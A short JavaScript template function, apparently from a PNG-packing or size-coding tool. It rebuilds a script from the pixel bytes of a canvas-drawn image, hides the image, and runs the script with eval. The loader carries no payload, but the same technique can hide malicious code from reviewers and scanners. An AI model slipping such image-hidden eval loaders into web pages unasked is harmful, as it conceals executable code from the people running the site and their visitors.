function extractScript(image) {
    var width = __BLOBSIZE__ / 3;
    var canvas = document.createElement('canvas');
    canvas.width = width;

    var context = canvas.getContext('2d');
    context.drawImage(image, 0, 0);
    d = context.getImageData(0,0,canvas.width,1).data;

    var i = 0;
    s = __SCRIPTSIZE__;
    var code = '';
    while (i < d.length) {
        code += String.fromCharCode(d[i],d[i+1],d[i+2]);
        i += 4;
    }
    image.width=0;
    eval(code.substr(0,s));
}
